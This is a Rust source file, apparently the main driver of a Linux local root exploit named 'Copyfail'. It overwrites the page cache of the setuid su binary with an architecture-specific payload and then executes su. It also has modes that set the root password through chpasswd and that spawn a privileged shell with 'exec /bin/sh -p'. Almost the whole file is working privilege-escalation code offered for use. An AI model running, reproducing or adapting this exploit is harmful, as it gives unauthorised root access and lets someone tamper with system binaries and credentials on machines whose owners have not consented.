        lines.push(format!("Symlink target: {}", target.display()));
    }

    lines.extend([
        format!("Metadata mode: {}", format_mode_bits(metadata.mode())),
        format!("setuid bit: {}", if setuid { "yes" } else { "no" }),
        format!("uid: {} gid: {}", metadata.uid(), metadata.gid()),
        format!("size: {} bytes", metadata.len()),
        format!(
            "read-only open as current user: {}",
            if readonly_open { "yes" } else { "no" }
        ),
    ]);

    if alpine_busybox_hint {
        lines.push(
            "Detected Alpine/BusyBox-style layout: /bin/su -> /bin/bbsuid with mode 4111. This typically means su is provided via BusyBox's bbsuid helper rather than a standalone shadow-utils su binary.".to_string(),
        );
    }

    Ok(lines.join("\n"))
}

fn execute_su(exec_path: Option<&Path>) -> Result<()> {
    eprintln!("Executing payload");
    let err = if let Some(path) = exec_path {
        Command::new("su").arg(path).exec()
    } else {
        Command::new("su").exec()
    };
    Err(err.into())
}

fn read_password_from_stdin() -> Result<String> {
    let mut password = String::new();
    io::stdin().read_line(&mut password)?;
    while password.ends_with(['\n', '\r']) {
        password.pop();
    }
    Ok(password)
}

fn set_root_password(password: &str) -> Result<bool> {
    let mut child = Command::new("su")
        .args(["-c", "chpasswd", "root"])
        .stdout(std::process::Stdio::inherit())
        .stderr(std::process::Stdio::inherit())
        .stdin(std::process::Stdio::piped())
        .spawn()?;

    let mut stdin = child
        .stdin
        .take()
        .ok_or(error::CopyfailError::ChildStdinUnavailable)?;
    stdin.write_all(b"root:")?;
    stdin.write_all(password.as_bytes())?;
    stdin.write_all(b"\n")?;
    drop(stdin);

    Ok(child.wait()?.success())
}

const UID_RECOVERY_SHELL_COMMAND: &str = "printf 3 > /proc/sys/vm/drop_caches; exec /bin/sh -p";

fn run() -> Result<()> {
    let cli = Cli::parse();
    let su_path = su::resolve_su()?;

    if cli.check {
        println!("{}", inspect_su_target(&su_path)?);
        return Ok(());
    }

    if cli.uid {
        let username = uid_flip::run()?;
        eprintln!("[*] Running: su {username}");
        eprintln!("[*] Page cache will be recovered before the root shell starts.");
        let err = Command::new("su")
            .args(["-c", UID_RECOVERY_SHELL_COMMAND, &username])
            .exec();
        return Err(err.into());
    }

    if cli.escalate || cli.set_password {
        escalate::run()?;
        eprintln!();
        if cli.set_password {
            eprintln!("[*] Reading new root password from stdin...");
            let password = read_password_from_stdin()?;
            eprintln!("[*] Setting root password via chpasswd...");
            if set_root_password(&password)? {
                eprintln!("[+] Root password set successfully.");
            } else {
                eprintln!("[-] Automated password set failed. Use 'passwd root' manually.");
            }
            eprintln!("[*] Recovery: echo 3 > /proc/sys/vm/drop_caches");
            return Ok(());
        }
        eprintln!("[*] Recovery: echo 3 > /proc/sys/vm/drop_caches");
        eprintln!("[*] Running: su root (no password needed)");
        eprintln!();
        let err = Command::new("su").arg("root").exec();
        return Err(err.into());
    }

    let exec_mode = cli.exec.is_some();
    let payload = payloads::payload_for_current_arch(exec_mode)?;

    if let Some(ref backup) = cli.backup {
        su::backup_su_binary(&su_path, backup)?;
        eprintln!("Backed up {} to {}", su_path.display(), backup.display());
    }

    let file = File::open(&su_path)?;
    eprintln!(
        "Overwriting page cache of {} with {} bytes",
        su_path.display(),
        payload.len()
    );
    exploit::overwrite_file(&file, &payload)?;
    execute_su(cli.exec.as_deref())
}

fn main() {
    if let Err(err) = run() {
        eprintln!("{err}");
        std::process::exit(1);
    }
}
